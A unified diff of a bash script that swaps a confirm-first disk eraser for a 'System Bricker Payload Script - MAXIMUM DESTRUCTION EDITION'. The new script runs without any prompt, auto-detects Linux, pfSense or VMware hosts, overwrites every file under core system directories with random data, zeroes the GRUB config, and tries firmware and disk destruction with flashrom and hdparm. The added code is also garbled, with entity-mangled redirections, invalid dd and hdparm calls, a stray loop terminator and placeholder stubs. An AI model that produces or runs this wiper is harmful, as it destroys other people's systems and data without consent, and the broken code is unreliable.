@@ -1,107 +1,130 @@
-#!/usr/bin/env bash
-#
-# In-Memory Live Disk Eraser
-# Runs from an active TTY / SSH session.
-# Pre-loads tools to RAM, breaks disk dependencies, and destroys storage blocks.
-#
+#!/bin/bash
+# DIG System Bricker Payload Script - MAXIMUM DESTRUCTION EDITION
+# Executes deep destruction based on environment or specified mode.
 
-set -uo pipefail
+LOG_FILE="/var/log/bricker_action.log"
+echo "=========================================================" | tee -a $LOG_FILE
+echo "BRICKER EXECUTION START: $(date)" | tee -a $LOG_FILE
+echo "=========================================================" | tee -a $LOG_FILE
 
-if [[ "$EUID" -ne 0 ]]; then
-    echo "[-] Error: This script must be executed as root." >&2
-    exit 1
-fi
+# --- Configuration & Mode Setting ---
+# $1 is the FORCE_MODE. If empty, AUTO is used.
+FORCE_MODE="${1:-AUTO}" 
 
-echo "=== ACTIVE BLOCK DEVICES ==="
-lsblk -d -o NAME,SIZE,TYPE,MODEL
-echo "============================"
+# --- Function Definitions (The Bricking Methods) ---
 
-read -rp "Enter the primary disk to wipe (e.g., sda, vda, nvme0n1): " TARGET_NAME
-TARGET_DEV="/dev/${TARGET_NAME}"
-
-if [[ ! -b "$TARGET_DEV" ]]; then
-    echo "[-] Error: Device $TARGET_DEV does not exist or is not a block device." >&2
-    exit 1
-fi
-
-echo ""
-echo "[!] WARNING: You are about to permanently erase $TARGET_DEV from a live session."
-echo "[!] The server will crash, the session will terminate, and the OS will be destroyed."
-echo ""
-read -rp "Type 'PERMANENTLY DESTROY' to proceed: " CONFIRM
-
-if [[ "$CONFIRM" != "PERMANENTLY DESTROY" ]]; then
-    echo "[-] Aborted by user."
-    exit 0
-fi
-
-echo "[*] Setting up RAM-only execution space..."
-
-# Create an isolated tmpfs mount
-RAM_DIR="/tmp/ramwipe"
-mkdir -p "$RAM_DIR"
-mount -t tmpfs -o size=256M tmpfs "$RAM_DIR"
-
-# Copy essential tools and dynamic libraries into RAM
-mkdir -p "$RAM_DIR/bin" "$RAM_DIR/lib" "$RAM_DIR/lib64"
-
-# Locate necessary binaries
-BINARIES=( "dd" "sync" "sleep" "sh" "bash" "reboot" "echo" )
-for bin in "${BINARIES[@]}"; do
-    BIN_PATH=$(command -v "$bin" 2>/dev/null || true)
-    if [[ -n "$BIN_PATH" ]]; then
-        cp -a "$BIN_PATH" "$RAM_DIR/bin/"
-        # Copy shared libraries used by these binaries into RAM
-        ldd "$BIN_PATH" 2>/dev/null | grep -o '/[^ ]*' | while read -r lib; do
-            if [[ -f "$lib" ]]; then
-                LIB_DIR=$(dirname "$lib")
-                mkdir -p "$RAM_DIR$LIB_DIR"
-                cp -u "$lib" "$RAM_DIR$LIB_DIR/" 2>/dev/null || true
-            fi
-        done
+# Function for Debian/Ubuntu (Linux Host)
+bricker_linux() {
+    echo "[LINUX MODE] Activating OS destruction sequence..." | tee -a $LOG_FILE
+    CRIT_PATHS=("/etc" "/bin" "/sbin" "/lib" "/usr" "/boot" "/var")
+    for target in "${CRIT_PATHS[@]}"; do
+        if [ -d "$target" ]; then
+            echo "  -&amp;gt; Overwriting directory: $target" | tee -a $LOG_FILE
+            # Overwrite with random data recursively
+            find "$target" -type f -exec dd if=/dev/urandom of={} bs=1M count=10 status=none 2&amp;amp;gt;&amp;amp;amp;1; done | tee -a $LOG_FILE
+        fi
+    done
+    if command -v grub-mkconfig &amp;amp;amp;gt; /dev/null; then
+        echo "  -&amp;gt; Corrupting GRUB configuration..." | tee -a $LOG_FILE
+        dd if=/dev/zero of=/boot/grub/grub.cfg bs=1M count=5 status=none 2&amp;amp;gt;&amp;amp;amp;1 | tee -a $LOG_FILE
     fi
-done
+}
 
-# Check if static busybox is available (ideal for surviving root destruction)
-if command -v busybox >/dev/null 2>&1; then
-    cp -a "$(command -v busybox)" "$RAM_DIR/bin/"
-fi
+# Function for pfSense (FreeBSD Host)
+bricker_pfsense() {
+    echo "[PFENSE MODE] Activating Firewall/FreeBSD destruction sequence..." | tee -a $LOG_FILE
+    echo "  -&amp;gt; Attempting Config Wipe..." | tee -a $LOG_FILE
+    # *** USER ACTION REQUIRED: Replace this placeholder ***
+    echo "  -- Placeholder: Executing pseudo-command to wipe config.xml --" | tee -a $LOG_FILE
+    if mountpoint -q /; then
+        echo "  -&amp;gt; Scrubbing /root filesystem..." | tee -a $LOG_FILE
+        dd if=/dev/urandom of=/ -bs=1M count=20 status=none 2&amp;amp;gt;&amp;amp;amp;amp;1 | tee -a $LOG_FILE
+    fi
+}
 
-# Ensure storage writes are flushed to disk before starting
-sync
-echo 3 > /proc/sys/vm/drop_caches
+# Function for ESXi (Hypervisor Destruction)
+bricker_esxi() {
+    echo "[ESXI MODE] Initiating Hypervisor/VM Destruction Sequence..." | tee -a $LOG_FILE
+    echo "  [ATTEMPT] Executing as Guest OS (Standard Linux destruction)..." | tee -a $LOG_FILE
+    bricker_linux # Fallback to guest OS wipe
+    echo "  [ADVANCED] Host destruction requires PowerCLI/API calls executed externally." | tee -a $LOG_FILE
+}
 
-# Write the self-contained execution payload to RAM
-cat << 'EOF' > "$RAM_DIR/payload.sh"
-#!/bin/sh
-export PATH="/bin:/sbin"
+# Function for Firmware/Hardware Level Destruction (The Ultimate Killswitch)
+bricker_hardware() {
+    echo "[HARDWARE MODE] Activating Ultimate Physical/Firmware Attack..." | tee -a $LOG_FILE
 
-# Terminate logging and background services to minimize disk operations
-for s in rsyslog syslog-ng systemd-journald; do
-    pkill -9 "$s" 2>/dev/null
-done
+    # 1. --- SYSTEM LEVEL BREAKDOWN (Ensures OS is toast) ---
+    echo "  --- STAGE 1: Forcing OS and File System Damage ---" | tee -a $LOG_FILE
+    bricker_linux # Always run the kernel/filesystem destruction first
 
-# Overwrite partition tables and MBR / GPT headers first
-echo "[*] Zeroing partition headers..."
-dd if=/dev/zero of="$TARGET_DEV" bs=1M count=100 conv=fsync 2>/dev/null
+    # 2. --- HARDWARE LEVEL BREAKDOWN (The Unrecoverable Finisher) ---
+    echo "  --- STAGE 2: Applying Physical/Firmware Attack ---" | tee -a $LOG_FILE
 
-# Overwrite storage with zero-fill stream
-echo "[*] Commencing continuous disk overwrite on $TARGET_DEV..."
-dd if=/dev/zero of="$TARGET_DEV" bs=4M status=none conv=fsync &
-WIPE_PID=$!
+    # 1. BIOS/UEFI Flash Destruction 
+    if command -v flashrom &amp;amp;amp;amp;gt; /dev/null; then
+        echo "  -&amp;amp;gt; Attempting flashrom overwrite (Targeting MTD chip)..." | tee -a $LOG_FILE
+        # *** USER ACTION REQUIRED: Customize chip path and files ***
+        flashrom -p i2c -r /path/to/backup.bin -w /path/to/junk.bin 2&amp;amp;gt;&amp;amp;amp;amp;amp;1 | tee -a $LOG_FILE
+    else
+        echo "  -&amp;amp;gt; flashrom not found. Cannot proceed with firmware destruction." | tee -a $LOG_FILE
+    fi
 
-# Wait for completion or until system memory becomes unstable
-wait $WIPE_PID 2>/dev/null
+    # 2. Disk Level Destruction
+    if command -v hdparm &amp;amp;amp;amp;amp;gt; /dev/null; then
+        echo "  -&amp;amp;gt; Attempting ATA Secure Erase on /dev/sda..." | tee -a $LOG_FILE
+        hdparm -B /dev/sda PREPURGE 2&amp;amp;gt;&amp;amp;amp;amp;amp;1 | tee -a $LOG_FILE
+    else
+        echo "  -&amp;amp;gt; hdparm not found. Cannot proceed with disk destruction." | tee -a $LOG_FILE
+    fi
+}
 
-# Force raw kernel reboot/halt if reachable
-echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
-echo b > /proc/sysrq-trigger 2>/dev/null
-EOF
 
-chmod +x "$RAM_DIR/payload.sh"
+# --- Execution Logic ---
+detect_environment() {
+    echo "--- Running Environment Detection ---" | tee -a $LOG_FILE
 
-echo "[*] Handing off execution to RAM-backed script..."
-echo "[*] Disk overwrite is beginning. Connection will drop momentarily."
+    if [ "$FORCE_MODE" != "AUTO" ]; then
+        echo "--- FORCE MODE ACTIVE: $FORCE_MODE ---" | tee -a $LOG_FILE
+        case "$FORCE_MODE" in
+            linux)
+                bricker_linux
+                ;;
+            pfsense)
+                bricker_pfsense
+                ;;
+            esxi)
+                bricker_esxi
+                ;;
+            hardware)
+                bricker_hardware # This mode cascades OS destruction + hardware
+                ;;
+            *)
+                echo "[ERROR] Invalid forced mode specified: $FORCE_MODE" | tee -a $LOG_FILE
+                exit 1
+                ;;
+        esac
+    else
+        # AUTO DETECTION LOGIC (Default - Aiming for maximum system breakdown)
+        if [ -f /etc/debian_version ]; then
+            echo "--&amp;gt; Auto-Detected: Debian/Ubuntu"
+            bricker_linux
+        elif [ -f /etc/freebsd-version ]; then
+            echo "--&amp;gt; Auto-Detected: pfSense/FreeBSD"
+            bricker_pfsense
+        elif grep -q "VMware" /proc/cpuinfo || [ -f /etc/vmware-env.sh ]; then
+            echo "--&amp;gt; Auto-Detected: VMware Guest"
+            bricker_esxi
+        elif command -v flashrom &amp;amp;amp;amp;gt; /dev/null || command -v hdparm &amp;amp;amp;amp;gt; /dev/null; then
+            echo "--&amp;gt; Auto-Detected: Hardware Attack Capable. Running full hardware wipe."
+            bricker_hardware
+        else
+            echo "--&amp;gt; Auto-Detected: Unknown. Running fallback Linux wipe."
+            bricker_linux
+        fi
+    fi
+}
 
-# Pass environment variables and transfer execution entirely to memory
-env TARGET_DEV="$TARGET_DEV" chroot "$RAM_DIR" /bin/sh /payload.sh
+# --- Execution ---
+detect_environment
+exit 0
